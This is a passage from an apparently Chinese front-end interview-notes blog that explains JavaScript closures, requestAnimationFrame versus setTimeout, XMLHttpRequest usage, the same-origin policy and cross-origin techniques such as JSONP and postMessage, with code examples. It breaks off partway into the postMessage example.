<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>)</span>&#123;    </span><br><span class="line">  <span class="keyword">var</span> name = <span class="string">"default"</span>;       </span><br><span class="line">  <span class="keyword">return</span> &#123;    </span><br><span class="line">    getName: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;    </span><br><span class="line">      <span class="keyword">return</span> name;    </span><br><span class="line">    &#125;,    </span><br><span class="line">    setName: <span class="function"><span class="keyword">function</span>(<span class="params">newName</span>) </span>&#123;    </span><br><span class="line">      name = newName;    </span><br><span class="line">    &#125;    </span><br><span class="line">  &#125;    </span><br><span class="line">&#125;;   </span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> Person();</span><br><span class="line">p.setName(<span class="string">"Tom"</span>);</span><br><span class="line">alert(p.getName()); <span class="comment">// Tom</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Jack = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="comment">//继承自Person</span></span><br><span class="line">Jack.prototype = <span class="keyword">new</span> Person();</span><br><span class="line"><span class="comment">//添加私有方法</span></span><br><span class="line">Jack.prototype.Say = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  alert(<span class="string">"Hello,my name is Jack"</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> j = <span class="keyword">new</span> Jack();</span><br><span class="line">j.setName(<span class="string">"Jack"</span>);</span><br><span class="line">j.Say();</span><br><span class="line">alert(j.getName());</span><br></pre></td></tr></table></figure>
<p>我们定义了Person，它就像一个类，我们new一个Person对象，访问它的方法。<br>下面我们定义了Jack，继承Person，并添加自己的方法。</p>
</li>
</ul>
<h3 id="闭包优缺点"><a href="#闭包优缺点" class="headerlink" title="闭包优缺点"></a>闭包优缺点</h3><ol>
<li><p>优点</p>
<ul>
<li>缓存</li>
<li>面向对象中的对象</li>
<li>实现封装，防止变量跑到外层作用域中，发生命名冲突</li>
<li>匿名自执行函数，匿名自执行函数可以减小内存消耗</li>
</ul>
</li>
<li><p>缺点</p>
<ul>
<li><p>内存消耗<br>通常来说，函数的活动对象会随着执行期上下文一起销毁，但是，由于闭包引用另外一个函数的活动对象，因此这个活动对象无法被销毁，这意味着，闭包比一般的函数需要更多的内存消耗。</p>
</li>
<li><p>性能问题<br>使用闭包时，会涉及到跨作用域访问，每次访问都会导致性能损失。<br>因此在脚本中，最好小心使用闭包，它同时会涉及到内存和速度问题。不过我们可以通过把跨作用域变量存储在局部变量中，然后直接访问局部变量，来减轻对执行速度的影响。</p>
</li>
</ul>
</li>
</ol>
<hr>
<h2 id="实现一个持续的动画"><a href="#实现一个持续的动画" class="headerlink" title="实现一个持续的动画"></a>实现一个持续的动画</h2><h3 id="css-animation"><a href="#css-animation" class="headerlink" title="css animation"></a>css animation</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">keyframes</span> ani&#123;</span><br><span class="line">  <span class="selector-tag">from</span> &#123;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-tag">to</span>&#123;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">200px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line">  <span class="attribute">animation</span>: ani <span class="number">5s</span> linear infinite;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="js"><a href="#js" class="headerlink" title="js"></a>js</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用requestAnimationFrame</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="requestAnimationFrame和setTimeout区别"><a href="#requestAnimationFrame和setTimeout区别" class="headerlink" title="requestAnimationFrame和setTimeout区别"></a>requestAnimationFrame和setTimeout区别</h2><p>图像在屏幕上更新的速度（频率），也即屏幕上的图像每秒钟出现的次数，它的单位是赫兹(Hz)。对于一般笔记本电脑，这个频率大概是60Hz。</p>
<p><code>setTimeout</code> 其实就是通过设置一个间隔时间来不断的改变图像的位置，从而达到动画效果的。但我们会发现，利用seTimeout实现的动画在某些低端机上会出现卡顿、抖动的现象。</p>
<p><code>setTimeout</code> 的执行步调和屏幕的刷新步调不一致，从而引起丢帧现象 <code>setTimeout</code> 的执行只是在内存中对图像属性进行改变，这个变化必须要等到屏幕下次刷新时才会被更新到屏幕上。如果两者的步调不一致，就可能会导致中间某一帧的操作被跨越过去，而直接更新下一帧的图像。假设屏幕每隔16.7ms刷新一次，而setTimeout每隔10ms设置图像向左移动1px。</p>
<p><code>requestAnimationFrame</code> 最大的优势是由系统来决定回调函数的执行时机。具体一点讲，如果屏幕刷新率是60Hz,那么回调函数就每16.7ms(1000/60)被执行一次，如果刷新率是75Hz，那么这个时间间隔就变成了1000/75=13.3ms，换句话说就是，<code>requestAnimationFrame</code> 的步伐跟着系统的刷新步伐走，这样就不会引起丢帧现象，也不会导致动画出现卡顿的问题。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> progress = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//回调函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  progress += <span class="number">1</span>; <span class="comment">//修改图像的位置</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (progress &lt; <span class="number">100</span>) &#123;</span><br><span class="line">    <span class="comment">//在动画没有结束前，递归渲染</span></span><br><span class="line">    <span class="built_in">window</span>.requestAnimationFrame(render);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//第一帧渲染</span></span><br><span class="line"><span class="built_in">window</span>.requestAnimationFrame(render);</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="通信"><a href="#通信" class="headerlink" title="通信"></a>通信</h2><h3 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h3><ol>
<li>Cookie、LocalStorage、IndexDB无法读取</li>
<li>前端跨域的几种解决办法</li>
<li>AJAX 请求不能发送</li>
</ol>
<h3 id="前后端如何通信"><a href="#前后端如何通信" class="headerlink" title="前后端如何通信"></a>前后端如何通信</h3><ol>
<li>Ajax</li>
<li>Websocket</li>
<li>CORS</li>
</ol>
<h3 id="如何创建Ajax"><a href="#如何创建Ajax" class="headerlink" title="如何创建Ajax"></a>如何创建Ajax</h3><ol>
<li>XMLHttpRequest对象工作流程</li>
<li>兼容性处理</li>
<li>事件触发条件</li>
<li>事件触发顺序</li>
</ol>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> xhr = <span class="built_in">window</span>.XMLHttpRequest ? <span class="keyword">new</span> XMLHttpRequest() : <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 请求成功回调函数</span></span><br><span class="line">xhr.onload = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'request success'</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 请求结束</span></span><br><span class="line">xhr.onloadend = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'request loadend'</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 请求出错</span></span><br><span class="line">xhr.onerror = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'request error'</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 请求超时</span></span><br><span class="line">xhr.ontimeout = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'request timeout'</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 请求回调函数</span></span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (xhr.readyState !== <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (xhr.status === <span class="number">200</span>) &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'request success'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'request error'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.timeout = <span class="number">0</span>; <span class="comment">// 设置超时时间,0表示永不超时</span></span><br><span class="line"><span class="comment">// 初始化请求</span></span><br><span class="line">xhr.open(<span class="string">'GET/POST/DELETE/...'</span>, <span class="string">'/url'</span>, <span class="literal">true</span> || <span class="literal">false</span>);</span><br><span class="line"><span class="comment">// 设置期望的返回数据类型 'json' 'text' 'document' ...</span></span><br><span class="line">xhr.responseType = <span class="string">''</span>;</span><br><span class="line"><span class="comment">// 设置请求头</span></span><br><span class="line">xhr.setRequestHeader(<span class="string">''</span>, <span class="string">''</span>);</span><br><span class="line"><span class="comment">// 发送请求</span></span><br><span class="line">xhr.send(<span class="literal">null</span> || <span class="keyword">new</span> FormData || <span class="string">'a=1&amp;b=2'</span> || <span class="string">'json字符串'</span>);</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="前端跨域的几种解决办法"><a href="#前端跨域的几种解决办法" class="headerlink" title="前端跨域的几种解决办法"></a>前端跨域的几种解决办法</h2><blockquote>
<p>参考 <a href="https://segmentfault.com/a/1190000011145364" target="_blank" rel="noopener">segmentfault 前端常见跨域解决方案</a></p>
</blockquote>
<h3 id="什么是跨域？"><a href="#什么是跨域？" class="headerlink" title="什么是跨域？"></a>什么是跨域？</h3><p>跨域是指一个域下的文档或脚本试图去请求另一个域下的资源，这里跨域是广义的。<br>广义的跨域：</p>
<ol>
<li>资源跳转： A链接、重定向、表单提交</li>
<li>资源嵌入： <code>&lt;link&gt;</code>、<code>&lt;script&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;frame&gt;</code>等dom标签，还有样式中<code>background:url()</code>、<code>@font-face()</code>等文件外链</li>
<li>脚本请求： js发起的ajax请求、dom和js对象的跨域操作等</li>
</ol>
<p>其实我们通常所说的跨域是狭义的，是由浏览器同源策略限制的一类请求场景。</p>
<p><strong>什么是同源策略？</strong></p>
<p>同源策略/SOP（Same origin policy）是一种约定，由Netscape公司1995年引入浏览器，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，浏览器很容易受到XSS、CSFR等攻击。所谓同源是指”协议+域名+端口”三者相同，即便两个不同的域名指向同一个ip地址，也非同源。</p>
<p>同源策略限制以下几种行为：</p>
<ol>
<li>Cookie、LocalStorage 和 IndexDB 无法读取</li>
<li>DOM 和 JS对象无法获得</li>
<li>AJAX 请求不能发送</li>
</ol>
<h3 id="常见跨域场景"><a href="#常见跨域场景" class="headerlink" title="常见跨域场景"></a>常见跨域场景</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">URL                                      说明                是否允许通信</span><br><span class="line">http:<span class="comment">//www.domain.com/a.js</span></span><br><span class="line">http:<span class="comment">//www.domain.com/b.js         同一域名，不同文件或路径        允许</span></span><br><span class="line">http:<span class="comment">//www.domain.com/lab/c.js</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//www.domain.com:8000/a.js</span></span><br><span class="line">http:<span class="comment">//www.domain.com/b.js         同一域名，不同端口             不允许</span></span><br><span class="line"> </span><br><span class="line">http:<span class="comment">//www.domain.com/a.js</span></span><br><span class="line">https:<span class="comment">//www.domain.com/b.js        同一域名，不同协议             不允许</span></span><br><span class="line"> </span><br><span class="line">http:<span class="comment">//www.domain.com/a.js</span></span><br><span class="line">http:<span class="comment">//192.168.4.12/b.js           域名和域名对应相同ip           不允许</span></span><br><span class="line"> </span><br><span class="line">http:<span class="comment">//www.domain.com/a.js</span></span><br><span class="line">http:<span class="comment">//x.domain.com/b.js           主域相同，子域不同             不允许</span></span><br><span class="line">http:<span class="comment">//domain.com/c.js</span></span><br><span class="line"> </span><br><span class="line">http:<span class="comment">//www.domain1.com/a.js</span></span><br><span class="line">http:<span class="comment">//www.domain2.com/b.js        不同域名                      不允许</span></span><br></pre></td></tr></table></figure>
<h3 id="面试时选答"><a href="#面试时选答" class="headerlink" title="面试时选答"></a>面试时选答</h3><p>jsonp、iframe、postMessage、CORS、websocket、nginx代理、nodejs代理</p>
<h3 id="跨域解决方案"><a href="#跨域解决方案" class="headerlink" title="跨域解决方案"></a>跨域解决方案</h3><p>1、 通过jsonp跨域<br>2、 postMessage跨域<br>3、 跨域资源共享（CORS）<br>4、 nginx代理跨域<br>5、 nodejs中间件代理跨域<br>6、 WebSocket协议跨域<br>7、 document.domain + iframe跨域<br>8、 location.hash + iframe<br>9、 window.name + iframe跨域</p>
<h4 id="通过jsonp跨域"><a href="#通过jsonp跨域" class="headerlink" title="通过jsonp跨域"></a>通过jsonp跨域</h4><p>jsonp缺点：只能实现get一种请求。</p>
<blockquote>
<p>具体内部逻辑参考：<a href="https://blog.csdn.net/hansexploration/article/details/80314948" target="_blank" rel="noopener">CSDN jsonp原理详解</a></p>
</blockquote>
<ol>
<li><p>原生js实现<br>前端创建一个script标签，并将src设置为后端给的接口地址，插入到document即可自动发起请求（get请求）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">script.type = <span class="string">'text/javascript'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 传参并指定回调执行函数为onBack</span></span><br><span class="line">script.src = <span class="string">'http://www.domain2.com:8080/login?user=admin&amp;callback=onBack'</span>;</span><br><span class="line"><span class="built_in">document</span>.head.appendChild(script);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 回调执行函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onBack</span>(<span class="params">res</span>) </span>&#123;</span><br><span class="line">    alert(<span class="built_in">JSON</span>.stringify(res));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>服务端返回如下（返回时即执行全局函数）：<br>Response Content-Type: application/javascript，所以可以立即执行。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onBack(&#123;<span class="string">"status"</span>: <span class="literal">true</span>, <span class="string">"user"</span>: <span class="string">"admin"</span>&#125;)</span><br></pre></td></tr></table></figure>
<p>常见的Content-Type：<br>1). text/plain: 纯文本格式<br>2). text/xml: HTML格式<br>3). text/html: HTML代码<br>4). text/css: CSS代码<br>5). image/png、image/jpeg、image/gif: 图片格式<br>6). application/pdf: PDF格式<br>7). application/msword: Word格式<br>8). application/javascript: JavaScript格式（jsonp请求）<br>9). application/json: JSON格式<br>10). application/octet-stream: 二进制流数据（用户文件文件下载）<br>11). application/x-www-form-urlencoded: 提交表单<br>12). multipart/form-data: 文件上传</p>
</li>
</ol>
<p>  一个稍微标准的jsonp请求应该是这样的：<br>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;Object&#125; opt</span></span><br><span class="line"><span class="comment"> *      @param &#123;String&#125; url: 接口地址</span></span><br><span class="line"><span class="comment"> *      @param &#123;Object&#125; data: 辅助字段</span></span><br><span class="line"><span class="comment"> *      @param &#123;Number&#125; time: 超时时间，ms</span></span><br><span class="line"><span class="comment"> *      @param &#123;Function&#125; success: 成功回调</span></span><br><span class="line"><span class="comment"> *      @param &#123;Function&#125; error: 失败回调</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonp</span> (<span class="params">opt</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 生成script并插入到body中</span></span><br><span class="line">  <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(script);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 创建jsonp回调函数</span></span><br><span class="line">  <span class="keyword">var</span> callbackName = <span class="string">'业务名_jsonp_'</span> + <span class="keyword">new</span> <span class="built_in">Date</span>().getTime(); <span class="comment">// 将回调方法放在方法体内部</span></span><br><span class="line">  opt.data[<span class="string">'callback'</span>] = callbackName; <span class="comment">// 将回调函数放在data中传给后端</span></span><br><span class="line">  <span class="built_in">window</span>[callbackName] = <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">    opt.success &amp;&amp; opt.success(data); <span class="comment">// 最终将数据传给success</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置script地址，发送get请求</span></span><br><span class="line">  <span class="keyword">if</span> (opt.url.indexOf(<span class="string">'?'</span>) &gt; <span class="number">-1</span>) &#123;</span><br><span class="line">    script.src = opt.url + <span class="string">'&amp;'</span> + formatData(data);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    script.src = opt.url + <span class="string">'?'</span> +formatData(data);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// script一旦加载表名请求已经发送，可以开始移除相应的方法</span></span><br><span class="line">  script.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    kill();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 捕获到异常，移除相应的方法</span></span><br><span class="line">  script.onerror = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    kill();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 监听超时</span></span><br><span class="line">  <span class="keyword">if</span> (opt.time) &#123;</span><br><span class="line">    script.timer = setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      kill();</span><br><span class="line">      <span class="comment">// 添加相应的toast反馈</span></span><br><span class="line">    &#125;, opt.time);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// kill相关方法</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">kill</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    clearTimeout(script.timer);</span><br><span class="line">    script.remove();</span><br><span class="line">    <span class="keyword">delete</span> <span class="built_in">window</span>[callbackName];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 拼接data数据</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">formatData</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> arr = [];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> name <span class="keyword">in</span> data) &#123;</span><br><span class="line">		arr.push(<span class="built_in">encodeURIComponent</span>(name) + <span class="string">'='</span> + <span class="built_in">encodeURIComponent</span>(data[name]));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 添加一个随机数，防止缓存</span></span><br><span class="line">	arr.push(<span class="string">'v='</span> + random());</span><br><span class="line">	<span class="keyword">return</span> arr.join(<span class="string">'&amp;'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<ol start="2">
<li><p>jquery ajax</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    url: <span class="string">'http://www.domain2.com:8080/login'</span>,</span><br><span class="line">    type: <span class="string">'get'</span>,</span><br><span class="line">    dataType: <span class="string">'jsonp'</span>,  <span class="comment">// 请求方式为jsonp</span></span><br><span class="line">    jsonpCallback: <span class="string">"onBack"</span>,    <span class="comment">// 自定义回调函数名</span></span><br><span class="line">    data: &#123;&#125;,</span><br><span class="line">    success: <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(res); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
</li>
<li><p>vue.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.$http.jsonp(<span class="string">'http://www.domain2.com:8080/login'</span>, &#123;</span><br><span class="line">    params: &#123;&#125;,</span><br><span class="line">    jsonp: <span class="string">'onBack'</span></span><br><span class="line">&#125;).then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res); </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
</li>
<li><p>服务端处理<br>服务端的本质就是想办法再将reponse变成一段可执行的javascript代码，前端获取返回之后就会去调用设定好的全局方法，并且接收参数</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onBack(&#123;<span class="attr">status</span>: <span class="number">1</span>, <span class="attr">data</span>: &#123;&#125;&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>原理：script标签可跨域访问</p>
</li>
</ol>
<h4 id="postMessage跨域"><a href="#postMessage跨域" class="headerlink" title="postMessage跨域"></a>postMessage跨域</h4><p>postMessage是HTML5 XMLHttpRequest Level 2中的API，且是为数不多可以跨域操作的window属性之一，它可用于解决以下方面的问题：<br>a. 页面和其打开的新窗口的数据传递<br>b. 多窗口之间消息传递<br>c. 页面与嵌套的iframe消息传递<br>d. 上面三个场景的跨域数据传递</p>
<p><strong><em>用法</em></strong>：postMessage(data,origin)方法接受两个参数<br><strong>data</strong>：html5规范支持任意基本类型或可复制的对象，但部分浏览器只支持字符串，所以传参时最好用JSON.stringify()序列化。<br><strong>origin</strong>： 协议+主机+端口号，也可以设置为”*”，表示可以传递给任意窗口，如果要指定和当前窗口同源的话设置为”/“。</p>
<ol>
<li><p>a.html：(<a href="http://www.domain1.com/a.html" target="_blank" rel="noopener">http://www.domain1.com/a.html</a>)</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"iframe"</span> <span class="attr">src</span>=<span class="string">"http://www.domain2.com/b.html"</span> <span class="attr">style</span>=<span class="string">"display:none;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">       </span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> iframe = <span class="built_in">document</span>.getElementById(<span class="string">'iframe'</span>);</span></span><br><span class="line"><span class="javascript">    iframe.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> data = &#123;</span></span><br><span class="line"><span class="javascript">            name: <span class="string">'aym'</span></span></span><br><span class="line"><span class="undefined">        &#125;;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 向domain2传送跨域数据</span></span></span><br><span class="line"><span class="javascript">        iframe.contentWindow.postMessage(<span class="built_in">JSON</span>.stringify(data), <span class="string">'http://www.domain2.com'</span>);</span></span><br><span class="line"><span class="undefined">    &#125;;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 接受domain2返回数据</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="string">'data from domain2 ---&gt; '</span> + e.data);</span></span><br><span class="line"><span class="javascript">    &#125;, <span class="literal">false</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>b.html：(<a href="http://www.domain2.com/b.html" target="_blank" rel="noopener">http://www.domain2.com/b.html</a>)</p>
